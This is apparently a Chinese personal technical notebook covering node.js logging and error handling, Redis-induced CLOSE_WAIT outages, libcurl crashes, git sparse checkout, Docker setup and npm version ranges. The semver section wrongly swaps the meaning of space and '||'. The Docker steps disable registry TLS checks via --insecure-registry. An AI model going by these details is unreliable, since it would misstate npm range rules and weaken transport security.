   但是node.js下最好的写日志方式其实是将日志直接输出到错误输出（stderr），由 [[https://github.com/nodejitsu/forever][forever]] 、[[https://github.com/Unitech/pm2][pm2]] 这样的后台服务监护工具来写日志文件。这是因为node.js做为一种动态语言，容易出现异常，特别是前期开发阶段，很多分支没有跑到，往往是写日志的语句出错，此时日志库是很难做到将异常时程序的调用堆栈写到日志文件中的，由台后服务监护工具来做能确保万无一失。

** 参考

   - 《[[http://se77en.cc/2013/06/27/goodbye-node-forever-hello-pm2-translation/][告别node-forever,拥抱PM2]]》

* DONE linux服务器出现大量CLOSE_WAIT状态的连接                   :linux:node:redis:
  CLOSED: [2015-08-02 Sun 03:21]

  昨天服务器停止服务，node.js进程耗光了服务器的内存及CPU，node.js进程卡死无法被 =kill= 掉，最后要来root帐号密码，直接 =kill -9= 才结束掉进程。

  再次鄙视一下 [[https://github.com/nodejitsu/forever][forever]] ，杀不掉原来的 node.js 进程组也就罢了，竟然又拉起了一套新的 node.js 进程组。

  统计了一下 =10= 万个fd都耗光了，其中 =9= 万多个为 =CLOSE_WAIT= 状态，此时服务器已经无法响应请求。

** CLOSE_WAIT 状态介绍

   先看一副TCP连接关闭的状态图（ [[http://intronetworks.cs.luc.edu/current/html/tcp.html#index-29][来源]] ）：

   [[file:../static/tcp_normal_close.png]]

   被动关闭一方才会出现 =CLOSE_WAIT= 状态，由于被动关闭方未调用 =close= 关闭socket导致，问题肯定是由服务器代码引起。

   检测到对端socket关闭然后关闭本端socket是由 node.js 自行完成的，最大的可能是没有机会执行 =close= 。

   我们的应用客户端与服务器有一个tls长连接，当连接断开时客户端会等待3-10秒后尝试重连服务器，如果服务器出现卡顿会导致客户端频繁重连，

   如果服务器来不及关闭这些连接，则会出现 CLOSE_WAIT 状态的连接，占用大量文件描述符，减少 CLOSE_WAIT 超时时间能够在一定程度上缓解这个问题，

   但是对于我们这种长连接的环境，大量CLOSE_WAIT是问题的表象，而非根源。

   参考：《[[http://lvxuehu.iteye.com/blog/452487][解决CLOSE_WAIT 问题]]》

** 内存及CPU占用彪升问题

   伴随着 CLOSE_WAIT 出现的状况是 node.js 进程内存及CPU占用超高，单node.js进程内存占用达到 1.5G，CPU占用 90% 以上，此时应该会导致 node.js 响应慢，
   来不及关闭连上来的socket。

   所以解决问题的关键就是：找出什么原因导致 node.js 内存及CPU 100%占用。

   想到的可能是redis负载过高引起，从运维监控图上可以看出一些蹊跷，node.js出问题时redis的连接数也同样彪升，而出问题的机器上刚好就是跑redis的机器，
   另一台服务器一直相安无事，没有跑redis。

** 一次午夜故障元凶浮出水面

   在晚上两点的时候服务出现问题，同样的现象，特别留意了一下redis的统计，请求速度很低，只有1200，平时都是5000。偶然在进程列表中发现了 redis-rdb-bgsave 的身影，
   不断地执行ps看进程列表，发现 redis-rdb-bgsave 进程不断地出现，查看redis的持久化配置如下：
   
   #+begin_example
     save 900 1
     save 300 10
     save 60 10000
   #+end_example

   我们的系统有大量的redis，1分钟肯定过万，这样redis持久化变是常态了，而且由于用的是机械硬盘，持久化肯定会引起系统卡顿，先将它调整为15分钟最多持久化一次：

   #+begin_example
     config set save "900 1"
   #+end_example

   重启程序释放资源后系统开始正常响应，但是10多分钟后系统再次无响应，才想起一则经验教训：

   #+begin_example
     跑redis的机器至少要预留和redis占用内存同样大小的空闲内存空间，redis RDB持久化进行fork时最坏会占用双倍内存，内存不足就会动用交换分区，系统性能急剧下降。
   #+end_example

   于是，立即改配置将redis所在机器上的node.js cluster进程数调小，腾出大把内存，总算没有再出现问题，今晚终于可以入眠。

** 更多疑问

   - 我们的node.js进程为什么常常会占用很多内存？

   - netstat中看到CLOSE_WAIT状态的连接输入缓冲往往有数据，而ESTABLISHED状态的连接读写缓冲区往往为空，为什么？

   - node.js卡顿时forever杀不死反而启动了新实例帮倒忙，pm2就一定能够解决吗？

   - redis持久化引起服务挂掉，已经是在第二个项目中遇到了，终极解决方案是什么？

* DONE 升级redis到最新版本的过程                                      :redis:
  CLOSED: [2015-08-10 Mon 17:56]

  - 编译最新版本的redis，暂不要安装

    参见《[[http:7f168bd15b8988c5-redis.html][编译安装redis]]》
    
  - 将旧版的redis.conf配置文件中的配置项合入新版本redis.conf

    可能需要提前确认一下新版本redis是否兼容旧版本数据文件。

  - 卸载并停止旧版本redis

  - 安装新版本redis

    参见《[[http:7f168bd15b8988c5-redis.html][编译安装redis]]》

  - 启动新版本redis
* DONE linux下编程获取/etc/resolv.conf中的域名解析服务器            :linux:c:
  CLOSED: [2015-08-14 Fri 18:01]

  直接上代码吧：

  #+begin_src c
    #include <unistd.h>
    #include <sys/types.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <arpa/nameser.h>
    #include <resolv.h>

    int main(int argc, char *argv[])
    {
        struct __res_state res;
        res.options &= ~ RES_INIT;

        int err = res_ninit(&res);
        if (err) {
            fprintf(stderr, "res_init error: %d\n", err);
            return err;
        }

        char ip[16];
        for(int i = 0 ; i < res.nscount; ++i) {
            ip[0] = '\0';
            if (! inet_ntop(AF_INET, &res.nsaddr_list[i].sin_addr, ip, sizeof(ip))) {
                perror("inet_ntop");
                continue;
            }
            printf("ip: %s\n", ip);
        }

        res_nclose(&res);

        return 0;
    }
  #+end_src

  - 参考

    《[[http://stackoverflow.com/questions/2916675/programmatically-obtain-dns-servers-of-host][Programmatically obtain DNS servers of host]]》
* DONE 轻断食日（2015-8-25）                                            :轻断食:
  CLOSED: [2015-08-25 Tue 14:43]

  今天是轻断食日，感觉很自然，早上给小孩喂饭时也没有顺便吃一点，体重已经稳定在64-65公斤，最近几周已经调整为一周一天断食，目前的体重已经比较合理，等肌肉结实一点再恢复到一周二天断食继续减轻一些体重，仍然用的是前一天晚餐和第二天早餐不吃的方法，断食时间大部分在睡觉容易施行。

  Cheers!
* DONE 拉取git仓库的子目录                                              :git:
  CLOSED: [2015-08-26 Wed 18:17]
  
  我们的git仓库目录结构：

  #+begin_example
    http://server/company.git +
                              |
                              +- project1
                              |
                              +- project2
                              |
                              +- project3
                              |
                              +- ...
  #+end_example

  以前使用svn的时候是可以直接拉取其中一个子项目，像下面这样：

  #+begin_src sh
    svn checkout http://server/company.git/project1
  #+end_src

  但是git好像不支持这种用法，网上找了一下相关资料，可以借助git的 =Sparse checkout= 实现：

  #+begin_src sh
    git clone http://server/company.git --no-checkout
    cd company
    git config core.sparsecheckout true
    echo "project1/" > .git/info/sparse-checkout
    git checkout --
    cd ..
    ln -s company/project1 ./
  #+end_src

  - 参考

    《[[http://stackoverflow.com/questions/4114887/is-it-possible-to-do-a-sparse-checkout-without-checking-out-the-whole-repository][Is it possible to do a sparse checkout without checking out the whole repository first?]]》
* DONE process.exit导致的控制台输出不全                                :node:
  CLOSED: [2015-08-27 Thu 17:03]

** 案例程序

   #+begin_src js
     for(var i = 0; i < 10000; ++i) {
         console.log("this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log " + i);
     }
     process.exit(0);
   #+end_src

   这个程序输出 10000 行日志，然后结束进程。
    
   - =Emacs Shell= 以及 =GNOME Terminal= 下运行
    
     省略中间部分输出

     #+begin_example
       $ node /home/tangxinfa/Examples/test_exit.js
       this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0
       ...
       this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 119
       $ 
     #+end_example

     程序只输出了前面 200 行日志。

   - 按 =Ctrl+Alt+F2= 进入 2 号系统终端下运行
     
     省略中间部分输出
    
     #+begin_example
       $ node /home/tangxinfa/Examples/test_exit.js
       this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0
       ...
       this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999
       $ 
     #+end_example

     程序输出了全部日志。

   - =Emacs Shell= 以及 =GNOME Terminal= 下运行时将日志重定向到文件
     
     省略中间部分输出

     #+begin_example
       $ node /home/tangxinfa/Examples/test_exit.js > /tmp/test_exit.log
       $ tail -1 /tmp/test_exit.log
       this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999
       $ 
     #+end_example

     程序输出了全部日志。

   - 原因

     引用自 [[http://stackoverflow.com/questions/18748164/process-exit0-output-disappears][process.exit(0): output disappears?]]
     #+begin_quote
     当输出目标为终端或文件时，console 函数是同步的（避免程序过早退出导致丢消息），目标为管道时则为异步（避免长时间堵塞）。
     
     The console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).
     #+end_quote
     上面这段描述来自 [[https://nodejs.org/dist/latest-v0.12.x/docs/api/console.html][Node.js V0.12 官方文档]]。
     
     =Emacs Shell= 以及 =GNOME Terminal= 并非真正的终端，所以会丢消息。

** 解决方案

   主要解决问题的思路是要确保调用 process.exit 时标准输出及错误输出中的日志输出完毕。

   - 通过关闭流确保流输出完毕然后再退出

     process.stdout 及 process.stderr 是 [[https://nodejs.org/dist/latest-v6.x/docs/api/stream.html][Writable]] 流，通过关闭流确保流输出完毕然后再退出
     #+begin_src js
       process.stderr.end(function () {
           process.exit(1);
       });
     #+end_src

     运行以上码会出错
     #+begin_example
       events.js:141
             throw er; // Unhandled 'error' event
             ^

       Error: process.stderr cannot be closed.
           at WriteStream.stderr.destroy.stderr.destroySoon (node.js:649:20)
           at WriteStream.onSocketFinish (net.js:202:17)
           at emitNone (events.js:67:13)
           at WriteStream.emit (events.js:166:7)
           at finishMaybe (_stream_writable.js:478:14)
           at endWritable (_stream_writable.js:488:3)
           at WriteStream.Writable.end (_stream_writable.js:453:5)
           at WriteStream.Socket.end (net.js:406:31)
           at Object.<anonymous> (/home/tangxinfa/Examples/flush_on_exit.js:1:78)
           at Module._compile (module.js:409:26)
     #+end_example
   
     这是因为 process.stdout 及 process.stderr 比较特殊，不可关闭且无 finish 事件，引用自 [[https://nodejs.org/dist/latest-v6.x/docs/api/process.html#process_process_stderr][process.error 官方文档]]
     #+begin_quote
     The process.stderr property returns a Writable stream equivalent to or associated with stderr (fd 2).

     Note: process.stderr and process.stdout differ from other Node.js streams in several ways:

     1. They cannot be closed (end() will throw).
      
     2. They never emit the 'finish' event.
      
     3. Writes can block when output is redirected to a file.
      
        Note that disks are fast and operating systems normally employ write-back caching so this is very uncommon.

     4. Writes on UNIX will block by default if output is going to a TTY (a terminal).

     5. Windows functionality differs. Writes block except when output is going to a TTY.
     #+end_quote

   - 在 write 的回调函数中退出

     =writable.write= 的 =callback= 在数据写成功后调用，此时退出可以保证日志消息不丢失。
     
      #+begin_src js -n -r
          process.stdout.write('', function () {
            process.stderr.write('', function () { (ref:stderr-write)
                process.exit(1);
            });
        });
      #+end_src

     需要注意的是，此时的写日志后进程退出是异步的，进程退出前系统可能会在异常状态下运行一小段时间。

     早期的 [[https://github.com/Unitech/pm2][pm2]] 版本运行 node.js 应用时，由于它会通过重写 =process.stdout.write= 和 =process.stderr.write= 方法，接管标准输出和错误输出，改写后的函数无返回值并忽略传入的回调函数（见 [[https://github.com/Unitech/pm2/issues/2011][node.js's process.stderr.write or process.stdout.write behavier changed by pm2 #2011]]），导致进程不退出。可针对 [[https://github.com/Unitech/pm2][pm2]] 做特殊处理，使用 pm2 后日志还是会有丢失。

     #+begin_src js
       if (typeof(process.env.pm_id) == 'undefined') {
           process.stdout.write('', function () {
               process.stderr.write('', function () {
                   process.exit(1);
               });
           });
       } else {
           process.exit(1);
       }
     #+end_src

   - 使用 fs.writeSync

     在查阅最新的 node.js 官方文档时，惊喜地发现以下[[https://nodejs.org/dist/latest-v6.x/docs/api/process.html#process_event_uncaughtexception][代码片段]]
     #+begin_src js
       process.on('uncaughtException', (err) => {
         fs.writeSync(1, `Caught exception: ${err}`);
       });
     #+end_src

     使用 fs.writeSync 同步输出日志后再退出进程
     #+begin_src js
       process.on('uncaughtException', (err) => {
           fs.writeSync(1, `Caught exception: ${err}`);
           process.exit(1);
       });
     #+end_src
     
     process.stdout 和 process.stderr 流中滞留的数据没有机会输出，进程就退出了，只能保证使用 fs.writeSync 进行输出的日志不丢失，用来日志记录 uncaughtException 还是很合适的，使用 pm2 时，上面的代码会将异常日志写到 /root/.pm2/pm2.log，可以考虑改用 fs.appendFileSync 将异常日志写到应用的日志文件中。

     #+begin_src js
       process.on('uncaughtException', function(e) {
           fs.appendFileSync('/root/.pm2/app.log', e.stack);
           process.exit(1);
       });
     #+end_src

     但要注意的是，服务往往为了安全起见切换（setuid、setgid）到非特权帐号，可能没有权限写 pm2 为应用创建的日志文件。

* TODO Callbacks,Promises与Generators                       :javascript:node:

  感觉到node（或者javascript）编码正面临一个变迁： =Callbacks= -> =Promises= -> =Generators= 。

** Callbacks

   =Callbacks= （回调）是 =javascript= 语言的一项杀手级的特性，就像构造函数&析构函数（RAII）之于 =c++= 。

   每一门语言都声称可以支持这个特性那个特性（如：泛型、闭包、协程、lambda等等），但是一个特性的威力跟语言的设计哲学是息息相关的，
   几乎每一门语言都支持 =Callbacks= （回调），但要简洁地使用 =Callbacks= （回调）就要求这门语言支持闭包，在 =javascript= 和 =c/c++= 中使用回调感觉完全不同。

   =javascript= 中由于支持即时定义函数，而且支持闭包，回调函数可以直接引用代码外层保持的状态，很直观。

   而在 =c/c++= 中使用回调，要么你就要将状态全部通过参数传到回调函数中，新增或删除状态时，也要改变函数定义，很是繁琐，另外，由于函数定义与函数调用的位置相去甚远，
   阅读代码时要跳来跳去很是不便。

   代码逻辑复杂之后， =javascript= 容易导致 =[[http://callbackhell.com/][callback hell]]= （回调地狱），这是由于频繁在调用处直接定义回调函数引起的，将回调函数的定义从调用处移走，就可以解除  =[[http://callbackhell.com/][callback hell]]= （回调地狱） ，
   这个时候就会退化成 =c/c++= 回调，再也享受不到通过闭包传递回调函数上下文的优雅、顺序阅读代码的便捷。除了容易导致代码走形外， =Callbacks= （回调）在 =javascript= 中表现完美。

   =Callbacks= （回调） 正是烹小鲜易、治大国难。

** Promises


   
** 参考  
   - 《[[http://www.slideshare.net/wookieb/callbacks-promises-generators-asynchronous-javascript][Callbacks, promises, generators - asynchronous javascript]]》
* DONE node.js应用错误处理                                             :node:
  CLOSED: [2015-10-30 Fri 18:08]

  先看一个简单的示例：

  #+begin_src js
    app.post('/products', function (req, res) {
        service.add(req.body, function (err) {
            if (err) {
                logger.error(err.toString());
                res.statusCode = 500;
                return res.end({error: err.message});
            }

            res.statusCode = 200;
            res.end();
        });
    }};
  #+end_src

  上面的代码能够直接用于产品环境吗？

  对于稍微严谨的产品，答案肯定是 _否_ 。

  针对 service.add 调用失败提两个疑问：
  
    - 如何根据错误类型给客户端返回不同的响应，以便客户端更人性化（而非简单的弹消息框）？

    - err.message 会不会包含不应该给用户看到的信息？

  我们需要规范化错误类型，进行明确的分类标识，直到最外层的代码能够根据错误对象提供的信息，给客户端返回恰当的响应，
  下面是我能想到的一些基本原则：

  - 错误对象拥有统一的接口
    
    确保错误对象是一个Error类实例，如需要自定义错误类型，从Error类继承。

  - 对错误进行命名标识
    
    重量级的做法：为每一个错误类型自定义一个错误类。
    轻量级的做法：将Error对象的name属性设置为错误类型标识。

  - 在恰当的层次将底层Error对象转化为自定义的错误对象

    对底层返回的原始错误，尽可能在调用栈恰当的层次转化为合适应用层错误对象，但不必强制对所有底层错误进行转换，
    原生的Error对象可以认为是未标识的错误，这种错误可以默认处理（如：给客户端返回HTTP 500错误）。

  错误进行分类标识后的使用示例：

  #+begin_src js
    app.post('/products', function (req, res) {
        service.add(req.body, function (err) {
            if (err) {
                logger.error(err.toString());
                if (err.name === 'ProductAlreadyExists') {
                    res.statusCode = 400;
                } else {
                    err.message = '内部错误';
                    res.statusCode = 500;
                }
                return res.end({error: err.message});
            }

            res.statusCode = 200;
            res.end();
        });
    }};
  #+end_src

  优雅的错误处理是系统可维护性的重要组成部分，它和代码各部分息息相关，系统成型后很难再引入错误处理，设计系统时应该一开始就将它纳入考虑范围。

** 参考

   - 《[[https://www.joyent.com/developers/node/design/errors][Error Handling in Nodejs - Developer Center - Joyent]]》

     来自Joyent的Node.js错误处理最佳实践

   - 《[[https://cnodejs.org/topic/52090bc944e76d216af25f6f][Node.js下自定义错误类型 - CNode]]》

     派生Error类注意事项
   
   - 《[[https://docs.nodejitsu.com/articles/errors/what-is-the-error-object][What is the error object? - docs.nodejitsu.com]]》

     Error对象详解

   - 《[[http://www.bennadel.com/blog/2828-creating-custom-error-objects-in-node-js-with-error-capturestacktrace.htm][Creating Custom Error Objects In Node.js With Error.captureStackTrace()]]》

     直接可用的自定义Error类方案

   - [[https://github.com/jayyvis/extend-error][extend-error]]

     用于扩展Error类的node.js模块

   - [[https://github.com/davepacheco/node-verror][node-verror]]
     
     包裹原始Error对象，并且保证可访问性的node.js模块，Joyent的Node.js错误处理最佳实践中进行了推荐

   - 《[[https://github.com/davepacheco/node-verror/issues/15][Support for custom error types? · Issue #15 · davepacheco/node-verror]]》

     [[https://github.com/davepacheco/node-verror][node-verror]] 支持扩展的讨论

* DONE 肉肉又长回来了                                                   :轻断食:
  CLOSED: [2015-11-03 Tue 17:27]

  早上称了一下体重，到了67.8公斤，停止断食1个多月的成果就是长了5-6斤肉肉。

  轻断食是一种生活方式，果然没有说错。

  今天开始继续一周两断的生活，减下来以后也要维持一周一断才行。
* TODO node.js理解内存泄露                                             :node:

  线上跑了一个node.js服务，机器配置为8核CPU、16G内存，一台机器维持25000个长连接，8个node.js进程共占用5.6G内存，平均每个进程占用700MB内存。
  有一台未对外提供服务的机器上，该服务的每个进程占用437MB，这台机器上还有两个其它服务，一个每进程占用123MB，一个每进程占用76MB。

  那么问题来了：

  - 为什么会占用这么多内存？

  - 我怎么知道有没有内存泄露？

*** 闭包、事件处理与内存泄露

    注册的事件处理函数不注销会引起内存泄露吗？注册的回调函数常常是一个闭包，里面会持有外部对象的引用，这些外部对象将一直无法释放。

    特地去搜索了一下相关主题，找到了一个2010年7月19日的讨论《[[https://groups.google.com/forum/#!topic/nodejs/pXbJVo0NtaY][Necessary to clean up all event handlers? - Google 网上论坛]]》，
    下面是来自Isaac Schlueter的 [[https://groups.google.com/d/msg/nodejs/pXbJVo0NtaY/BxUmF_jp9LkJ][回复]] ： 

    #+begin_quote
    When the event emitter is garbage collected, its bound listeners go
    away as well (if the event emitter itself was the only thing aware of
    them.)  So, if it's a short-lived emitter, there's no need to add a
    .destroy method or manually clean up listeners.  That's just extra
    work that will slow down your app, and v8 will do it for you.

    If you need to keep the emitter around for a while, and want to bind a
    handler for a single use, then this pattern works well:
    #+end_quote
    #+begin_src js
      emitter.on("event", function runonce (er, data) {
        emitter.removeListener("event", runonce)
        // dosomething
      })
    #+end_src
    #+begin_quote
    Being inside a closure doesn't really affect the story much.  Since
    node runs on v8, and not an outdated ancient version of jscript, you
    don't have to worry about circular references any more ;)
    Mark-and-sweep does a fine job of reclaiming unreachable objects.
    #+end_quote

    翻译如下：

    #+begin_quote
    当 =event emitter= 被垃圾回收，它的所有 =listeners= 同时被回收（仅当 =event emitter= 唯一引用它们的时候），
    因此，对于生存期较短的 =emitter= ，是不需要添加 =destroy= 方法或手工清除 =listeners= 的，这些多此一举的工作会让你的程序变得更慢，
    =v8= 会为你代劳。

    如果你的 =emitter= 会活得久一些，但是你又想绑定一个一次性的事件处理器，可以使用下面的模式：
    #+end_quote
    #+begin_src js
      emitter.on("event", function runonce (er, data) {
        emitter.removeListener("event", runonce)
        // dosomething
      })
    #+end_src
    #+begin_quote
    在闭包中上面的描述也一样适用。由于 =node= 运行在 =v8= 上，并非过时的旧版本javascript，你再也不用担心循环引用。
    标志-擦除技术能够很好地回收不可达的对象。
    #+end_quote

    根据上面的描述，似乎没有必要担心闭包、事件处理会导致内存泄露。但是《Node.js High Performance》一个内存泄露的例子：

    #+begin_src js
      var leakObject = null;

      function MemoryLeak() {
          var originalObject = leakObject;
          leakObject = {
              longString: new Array(1000000).join("*"),
              someMethod: function () {
                  console.log(originalObject);
              }
          };
      }

      setInterval(function () {
          // Keep running.
      }, 1000000);

      var timer = setInterval(MemoryLeak, 1000);

      setTimeout(function () {
          clearInterval(timer);
          leakObject = null;
          console.log("stop leak");
      }, 30000);
    #+end_src

    这个例子运行后会不断地泄露内存，30秒后即使停止调用导致内存泄露的函数，并且将全局变量置空，内存也不会回收。

* TODO linux崩溃上报的设计与实现                                    :linux:c:

** 原理

** 疑难点

*** 崩溃上报程序本身不断崩溃，会不会引起死循环

*** 在读取崩溃源的过程中，引起崩溃的进程会不会处于僵死状态，干扰该程序的重新启动

** 实现

* DONE /etc/passwd、/etc/passwd+、/etc/passwd- 文件介绍               :linux:
  CLOSED: [2015-11-24 Tue 15:58]

  busybox下修改密码或创建用户的时候，有时候操作会失败，此时 =/etc= 目录可能出现 =passwd+= 、 =passwd-= 两个文件。

  当出现 =/etc/passwd+= 文件时，修改密码会耗时几秒钟然后报错：

  #+begin_example
    # passwd root
    Changing password for root
    New password: 123456

    Retype password: 123456

    passwd: can't create '/etc/passwd+': File exists
    passwd: can't update password file /etc/passwd
    # 
  #+end_example

** 根据 [[https://svn.mcs.anl.gov/repos/ZeptoOS/trunk/BGP/packages/busybox/src/libbb/update_passwd.c][update_passwd.c]] 可以获得以下信息

   - =/etc/passwd= 用户帐号配置文件

   - =/etc/passwd+= 更新过程中的临时文件

   - =/etc/passwd-= 用户帐号配置文件的备份
     
   更新密码逻辑：
 
   - 创建 =/etc/passwd+= 文件
 
     如果 =/etc/passwd+= 文件存在，则会返回错误.
 
   - 备份 =/etc/passwd= 文件到 =/etc/passwd-=
 
   - 更新后的帐号配置写到 =/etc/passwd+= 文件
 
   - 将 =/etc/passwd+= 文件重命名为 =/etc/passwd=

** 经验法则

   - =/etc/passwd= 文件损坏时，使用备份文件 =/etc/passwd-= 还原

   - =/etc/passwd+= 文件存在导致无法更新帐号信息，直接删除 =/etc/passwd+= 文件即可
     
   - 还会存在 =/etc/shadow= =/etc/shadow-= =/etc/shadow+= ，也是同样处理
   

* TODO 使用cluster后net模块listen时backlog参数失效                     :node:

  下面两个示例代码，我设置 =backlog= 为64。

  - 不使用 =cluster=

    #+begin_src js
      var http       = require('http');

      http.createServer(function(req, res) {
          res.writeHead(200);
          res.end("hello world\n");
      }).listen(3000, "0.0.0.0", 64);
    #+end_src

    =ss -ltn | grep 3000= 命令输出：

    #+begin_example
      LISTEN     0      64           *:3000                     *:*                  
    #+end_example


  - 使用 =cluster=

    #+begin_src js
      var cluster    = require('cluster'),
          http       = require('http');


      if (cluster.isMaster) {
          cluster.fork();
      } else {
          http.createServer(function(req, res) {
              res.writeHead(200);
              res.end("hello world\n");
          }).listen(3000, "0.0.0.0", 64);
      }
    #+end_src

    =ss -ltn | grep 3000= 命令输出：
    
    #+begin_example
      LISTEN     0      511          *:3000                     *:*                  
    #+end_example

    实际生效的 =backlog= 是默认值（511），这表明 =cluster= 模块未能正确处理 =listen= 时的 =backlog= 参数。

    通过 =strace= 命令可以进一步确认使用的 =backlog= 确实是 511：

    #+begin_example
      ...
      bind(11, {sa_family=AF_INET, sin_port=htons(3000), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
      listen(11, 511)                         = 0
      ...
    #+end_example

  - 如何修复

    According to =server.listen= 's implementation, if second or third parameter is Number,
    treat it as backlog, but for the =server.listen(options[, callback])= already have
    a backlog in options and has higher priority, i think it is better to avoid documention
    another standalone =backlog= parameter to avoid more confuse.

    当第二或第三个参数为数字时，总是做为 =backlog= ，由于 =server.listen(options[, callback])=
    的 =options= 中已经有 =backlog= 项了，不再在文档中描述 =backlog= 参数以免混乱。

* DONE 修复libcurl域名解析超时引起的内存越界问题                    :linux:c:
  CLOSED: [2015-12-09 Wed 14:17]

  程序发布后在一个用户的机器上频繁出现崩溃，最终定位到崩溃来自一个断言失败：

  #+begin_src c
    assert(pthread_self() != main_thread_id);
  #+end_src

  上面这条语句出现在工作线程回调的函数中，竟然发生了工作线程ID和主线程ID相同的怪事，
  观察了运行日志，发现使用libcurl发起HTTP请求如果超时则有很大机率会断言失败导致崩溃，
  在使用libcurl发起HTTP请求的代码块前后输出工作线程ID，工作线程ID出现了变化，
  根据经验很可能是出现了内存越界。

  最终找到了几篇 =libcurl= 多线程安全相关的文章：

  - 《[[http://blog.csdn.net/balderfan/article/details/7599554][libcurl 多线程使用注意事项]]》

  - 《[[http://blog.csdn.net/delphiwcdj/article/details/18284429][Libcurl多线程crash问题]]》

  修复步骤总结如下：
  
  - 在主线程起始处初始化 =libcurl= 库
    
    #+begin_src c
      curl_global_init(CURL_GLOBAL_ALL);
    #+end_src
    
  - 禁止 =libcurl= 通过 =alarm= 实现域名解析超时
    
    #+begin_src c
      curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    #+end_src

    如果不做下面的最后一步， =libcurl= 上设置的超时都会无效。
    
  - 编译 =libcurl= 时启用 =c-ares= 或 =threaded resolver= ，以支持域名解析超时
    
    #+begin_src sh
      ./configure --enable-ares
    #+end_src

    或

    #+begin_src sh
      ./configure --enable-threaded-resolver
    #+end_src

    《[[http://daniel.haxx.se/blog/2011/04/25/libcurls-name-resolving/][Asynch resolving in libcurl]]》对 =c-ares= 或 =threaded resolver= 两种方式进行了比较，简而言之：

    + =c-ares= 是一个异步的域名解析库，开销更少，但是它并非使用系统原生的方式实现，对于定制系统（如：hosts或resolv.conf不在标准位置）可能会有问题。

    + =threaded resolver= 每次域名解析都会开一个线程，解析完成后销毁线程，开销会大一些，但是稳定性、兼容性更好。

  按照上面的步骤启用 =c-ares= 进行修改后程序运行了一整天，没有再崩溃。
* DONE Archlinux下安装运行docker                           :archlinux:docker:
  CLOSED: [2015-12-09 Wed 23:07]

  - 安装 =docker=

    #+begin_src sh
      yaourt -S docker
    #+end_src

  - 配置 =docker=

    由于 =docker= 的官方仓库被墙，需要从 =dockerpool.com= 上下载，修改 =docker= 配置以免 =pull= 时出现 tls 相关错误。

    修改 =/usr/lib/systemd/system/docker.service= 文件，将
    
    #+begin_example
      ExecStart=/usr/bin/docker daemon -H fd:// --exec-opt native.cgroupdriver=cgroupfs
    #+end_example

    改为

    #+begin_example
      ExecStart=/usr/bin/docker daemon --insecure-registry dl.dockerpool.com:5000 -H fd:// --exec-opt native.cgroupdriver=cgroupfs
    #+end_example

    生效配置：

    #+begin_src sh
      sudo systemctl daemon-reload
    #+end_src

  - 启动 =docker= 服务

    #+begin_src sh
      sudo systemctl restart docker
    #+end_src

  - 下载 =ubuntu14.04= 镜像
    
    #+begin_src sh
      sudo docker pull 'dl.dockerpool.com:5000/ubuntu:14.04'
    #+end_src

  - 试运行容器
    
    #+begin_src sh
      sudo docker run -t -i 'dl.dockerpool.com:5000/ubuntu:14.04' /bin/bash
    #+end_src
* DONE package.json文件dependencies中的各种版本号形式                  :node:
  CLOSED: [2015-12-10 Thu 17:07]

  查看 =package.json= 文件时，往往会在 =dependencies= 下看到各种各样的版本号形式，示例如下：

  #+begin_src js
    "dependencies": {
        "async": "1.2.1",
        "chokidar": "^1.0.0",
        "vizion": "latest",
        "babel": "^5.x",
        "pm2-logs": "~0.1.1",
        "ikt": "git+http://ikt.pm2.io/ikt.git#master",
        "punt": "*",
        "express": ">=3.0.0",
        "connect": "1.30.2 - 2.30.2",
    }
  #+end_src

  一般自已写 =package.json= 时，图省事版本号会用 =*= ，想想也是很危险的，指不定哪天依赖的包不再向后兼容，程序运行估计就有问题了。

  版本号形式是有据可循的，它就是《[[http://semver.org/lang/zh-CN/][语义化版本 2.0.0]]》， =npm= 遵循该规范，但做了以下扩展：

  #+begin_quote
  版本号的构建号部分允许使用 =-= 字符，所以 =0.2.0-1= 在《[[http://semver.org/lang/zh-CN/][语义化版本 2.0.0]]》中是非法的，却是合法的 npm 语义版本（Semantic Versioning）。
  #+end_quote

  =npm= 使用 [[https://github.com/npm/node-semver][semver]] 包进行版本号解析。

** 版本号解析示例

   这篇文章《[[http://deadhorse.me/nodejs/2014/04/27/semver-in-nodejs.html][node.js 中的版本管理]]》对常见的版本号风格进行了解释，虽然对 =^= 前缀解析不清，但还是值得一看，同时了提供了使用建议。

   版本号格式： =主版本号.次版本号.修订号=

   - 1.2.1 :: 匹配指定版本，这里是匹配1.2.1。

   - ^1.0.0 :: 匹配 >=1.0.0 且 <2.0.0的版本。

               =^= 前缀意为 =与指定的版本兼容= 。

               =^= 前缀表示最左边的非0段不允许改变，该段之后的段可以为更高版，所以

               ^1.1.0 匹配 >=1.1.0 且 <2.0.0

               ^0.0.3 匹配 >=0.0.3 且 <0.0.4

   - latest :: 当前发布版本。

               这是一个标记（tag，详见 [[https://docs.npmjs.com/cli/dist-tag][dist-tag | npm Documentation]]），默认情况下 =npm install= 安装的就是这个 =latest= 标记。
               常见的标记还有 =next= =stable= =beta= =canary= 。
               
   - ^5.x :: 匹配 >=5.0.0 且 <6.0.0。

             =X=, =x= 及 =*= 为通配符，版本号尾部省略的段等同于通配符，所以

             *   匹配 >=0.0.0

             1   匹配 >=1.0.0 且 <2.0.0

             1.2 匹配 >=1.2.0 且 <1.3.0
             
   - ~0.1.1 :: 匹配 >=0.1.1 且 <0.2.0。

               =~= 前缀意为 =约等于版本=

               如果存在次版本号，则允许修订号为更高版，否则允许次版本号为更高版。

               ~1 匹配 >=1.0.0 且 <2.0.0

   - * :: 匹配 >=0.0.0
      
   - >=3.0.0 :: 同字面意义 >=3.0.0。

                其它操作符有 < <= > >= = ，多个表达式之间用 空格 分隔表示并集，用 || 分隔交集。
                 
   - 1.30.2 - 2.30.2 :: 匹配 >=1.30.2 且 <=2.30.2

        尾部缺失的节被替换为0再进行比较，如：1.30 - 2.30.2 同 1.30.0 - 2.30.2。
    
   - git+http://ikt.pm2.io/ikt.git#master :: Git URL形式的依赖

